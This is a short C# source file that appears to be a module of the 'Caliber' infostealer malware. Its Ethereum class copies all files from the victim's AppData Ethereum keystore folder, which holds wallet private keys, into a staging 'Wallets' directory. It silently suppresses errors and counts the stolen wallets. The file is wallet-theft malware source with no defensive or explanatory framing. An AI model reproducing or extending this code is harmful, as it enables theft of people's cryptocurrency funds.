﻿using System;
using System.IO;

namespace youknowcaliber
{
	internal class Ethereum
	{
		public static void EcoinStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Ethereum\\keystore").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Ethereum.EthereumDir);
					fileInfo.CopyTo(directorypath + Ethereum.EthereumDir + fileInfo.Name);
				}
				Ethereum.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		public static string EthereumDir = "\\Wallets\\Ethereum\\";
	}
}
